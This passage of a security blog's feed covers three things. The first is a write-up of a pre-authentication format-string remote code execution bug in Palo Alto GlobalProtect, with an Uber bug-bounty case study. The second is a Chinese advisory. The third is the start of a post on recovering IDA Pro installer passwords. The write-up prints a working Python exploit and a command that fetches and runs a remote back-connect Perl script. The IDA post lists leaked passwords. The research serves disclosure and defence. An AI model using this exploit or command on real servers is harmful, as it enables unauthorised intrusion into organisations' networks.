&lt;p&gt;The series 9.x and 7.0.x are not affected by this vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;how-to-verify-the-bug&quot;&gt;How to verify the bug&lt;/h2&gt;

&lt;p&gt;Although we know where the bug is, to verify the vulnerability is still not easy. There is no output for this format string so that we can’t obtain any address-leak to verify the bug. And to crash the service is never our first choice[1]. In order to avoid crashes, we need to find a way to verify the vulnerability elegantly!&lt;/p&gt;

&lt;p&gt;By reading the &lt;a href=&quot;https://linux.die.net/man/3/snprintf&quot;&gt;snprintf manual&lt;/a&gt;, we choose  the &lt;code class=&quot;highlighter-rouge&quot;&gt;%c&lt;/code&gt; as our gadget! When there is a number before the format, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;%9999999c&lt;/code&gt;, the &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; repeats the corresponding times internally. We observe the response time of large repeat number to verify this vulnerability!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=%9999999c&#39;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m1.721s
user    0m0.037s
sys     0m0.005s
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=%99999999c&#39;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m2.051s
user    0m0.035s
sys     0m0.012s
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=%999999999c&#39;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m5.324s
user    0m0.021s
sys     0m0.018s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, the response time increases along with the number of &lt;code class=&quot;highlighter-rouge&quot;&gt;%c&lt;/code&gt;. So, from the time difference, we can identify the vulnerable SSL VPN elegantly!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] Although there is a watchdog monitoring the &lt;code class=&quot;highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; daemon, it’s still improper to crash a service!&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-exploitation&quot;&gt;The exploitation&lt;/h2&gt;

&lt;p&gt;Once we can verify the bug, the exploitation is easy. To exploit the binary successfully, we need to determine the detail version first. We can distinguish by the Last-Modified header, such as the &lt;code class=&quot;highlighter-rouge&quot;&gt;/global-protect/portal/css/login.css&lt;/code&gt; from 8.x version and the &lt;code class=&quot;highlighter-rouge&quot;&gt;/images/logo_pan_158.gif&lt;/code&gt; from 7.x version!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; https://sslvpn/global-protect/portal/css/login.css | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Last-Modified
Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With a specified version, we can write our own exploit now. We simply modified the pointer of &lt;code class=&quot;highlighter-rouge&quot;&gt;strlen&lt;/code&gt; on the Global Offset Table(GOT) to the Procedure Linkage Table(PLT) of &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;. Here is the PoC:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/sslmgr&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;echo pwned &amp;gt; /var/appweb/sslvpndocs/hacked.txt&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x667788&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x445566&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%70&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$n&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;c&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%32&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;c&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%24&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn&#39;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;$p&#39;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;scep-profile-name=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;host-id=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;user-email=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the modification is done, the &lt;code class=&quot;highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; becomes our webshell and we can execute commands via:&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=curl orange.tw/bc.pl | perl -&#39;&lt;/span&gt; https://global-protect/sslmgr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;We have reported this bug to Palo Alto via the &lt;a href=&quot;https://securityadvisories.paloaltonetworks.com/Report&quot;&gt;report form&lt;/a&gt;. However, we got the following reply:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hello Orange,&lt;/p&gt;

  &lt;p&gt;Thanks for the submission. Palo Alto Networks does follow coordinated vulnerability disclosure for security vulnerabilities that are reported to us by external researchers. We do not CVE items found internally and fixed. This issue was previously fixed, but if you find something in a current version, please let us know.&lt;/p&gt;

  &lt;p&gt;Kind regards&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hmmm, so it seems this vulnerability is known for Palo Alto, but not ready for the world!&lt;/p&gt;

&lt;h2 id=&quot;the-case-study&quot;&gt;The case study&lt;/h2&gt;

&lt;p&gt;After we awared this is not a 0day, we surveyed all Palo Alto SSL VPN over the world to see if there is any large corporations using the vulnerable GlobalProtect, and Uber is one of them! From our survey, Uber owns about 22 servers running the GlobalProtect around the world, here we take &lt;code class=&quot;highlighter-rouge&quot;&gt;vpn.awscorp.uberinternal.com&lt;/code&gt; as an example!&lt;/p&gt;

&lt;p&gt;From the domain name, we guess Uber uses the BYOL from &lt;a href=&quot;https://aws.amazon.com/marketplace/pp/B00OC1T2D4?qid=1562269885823&amp;amp;sr=0-1&amp;amp;ref_=srh_res_product_title&quot;&gt;AWS Marketplace&lt;/a&gt;. From the login page, it seems Uber uses the 8.x version, and we can target the possible target version from the supported version list on the Marketplace overview page:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;8.0.3&lt;/li&gt;
  &lt;li&gt;8.0.6&lt;/li&gt;
  &lt;li&gt;8.0.8&lt;/li&gt;
  &lt;li&gt;8.0.9&lt;/li&gt;
  &lt;li&gt;8.1.0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally, we figured out the version, it’s 8.0.6 and we got the shell back!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190717/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Uber took a very quick response and right step to fix the vulnerability and Uber gave us a detail explanation to the bounty decision:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hey @orange — we wanted to provide a little more context on the decision for this bounty. During our internal investigation, we found that the Palo Alto SSL VPN is not the same as the primary VPN which is used by the majority of our employees.&lt;/p&gt;

  &lt;p&gt;Additionally, we hosted the Palo Alto SSL VPN in AWS as opposed to our core infrastructure; as such, this would not have been able to access any of our internal infrastructure or core services. For these reasons, we determined that while it was an unauthenticated RCE, the overall impact and positional advantage of this was low. Thanks again for an awesome report!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It’s a fair decision. It’s always a great time communicating with Uber and report to their &lt;a href=&quot;https://hackerone.com/uber&quot;&gt;bug bounty program&lt;/a&gt;. We don’t care about the bounty that much, because we enjoy the whole research process and feeding back to the security community! Nothing can be better than this!&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/</link>
                <guid>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study</guid>
                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Palo Alto GlobalProtect 資安通報</title>
                <description>&lt;h3 id=&quot;內容&quot;&gt;內容&lt;/h3&gt;

&lt;p&gt;在我們進行&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;紅隊演練&lt;/a&gt;的過程中，發現目標使用的 Palo Alto GlobalProtect 存在 format string 弱點，透過此弱點可控制該 SSL VPN 伺服器，並藉此進入企業內網。&lt;/p&gt;

&lt;p&gt;回報原廠後，得知這是個已知弱點並且已經 silent-fix 了，所以並未有 CVE 編號。經過我們分析，存在風險的版本如下，建議用戶儘速更新至最新版以避免遭受攻擊。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;9.x 和 7.0.x 並沒有存在風險。&lt;/p&gt;

&lt;h3 id=&quot;細節&quot;&gt;細節&lt;/h3&gt;

&lt;p&gt;我們也利用了這個弱點成功控制了 Uber 的 VPN 伺服器，詳細的技術細節請參閱我們的 Advisory：&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;

&lt;p&gt;這將會是我們 SSL VPN 研究的系列文，預計會有三篇。這也是我們研究團隊今年在 &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; 和 &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; 的演講『 &lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt; 』中的一小部分，敬請期待！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/</link>
                <guid>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory</guid>
                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Operation Crack: Hacking IDA Pro Installer PRNG from an Unusual Way</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Today, we are going to talk about the installation password of Hex-Rays IDA Pro, which is the most famous decompiler. What is installation password? Generally, customers receive a custom installer and installation password after they purchase IDA Pro. The installation password is required during installation process. However, if someday we find a leaked IDA Pro installer, is it still possible to install without an installation password? This is an interesting topic.&lt;/p&gt;

&lt;p&gt;After brainstorming with our team members, we verified the answer: Yes! With a Linux or MacOS version installer, we can easily find the password directly. With a Windows version installer, we only need 10 minutes to calculate the password. The following is the detailed process:&lt;/p&gt;

&lt;h3 id=&quot;-linux-and-macos-version&quot;&gt;* Linux and MacOS version&lt;/h3&gt;

&lt;p&gt;The first challenge is Linux and MacOS version. The installer is built with an installer creation tool called InstallBuilder. We found the plaintext installation password directly in the program memory of the running IDA Pro installer. Mission complete!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This problem is fixed after we reported through Hex-Rays. &lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; released InstallBuilder 19.2.0 with the protection of installation password on 2019/02/11.&lt;/p&gt;

&lt;h3 id=&quot;-windows-version&quot;&gt;* Windows version&lt;/h3&gt;

&lt;p&gt;It gets harder on Windows version because the installer is built with &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt;, which store its password with &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt;. Therefore, we cannot get the password simply with static or dynamic analyzing the installer, and brute force is apparently not an effective way. But the situation is different if we can grasp the methodology of password generation, which lets us enumerate the password more effectively!&lt;/p&gt;

&lt;p&gt;Although we have realized we need to find how Hex-Rays generate password, it is still really difficult, as we do not know what language the random number generator is implemented with. There are at least &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 random number generators&lt;/a&gt; known. It is such a great variation.&lt;/p&gt;

&lt;p&gt;We first tried to find the charset used by random number generator. We collected all leaked installation passwords, such as hacking team’s password, which is leaked by WikiLeaks.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the collected passwords we can summarize the charset:&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The missing of &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;n&lt;/code&gt; seems to make sense because they are confusing characters.&lt;br /&gt;
Next, we guess the possible charset ordering like these:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lastly, we picked some common languages（c/php/python/perl）to implement a random number generator and enumerate all the combinations. Then we examined whether the collected passwords appears in the combinations. For example, here is a generator written in C language:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
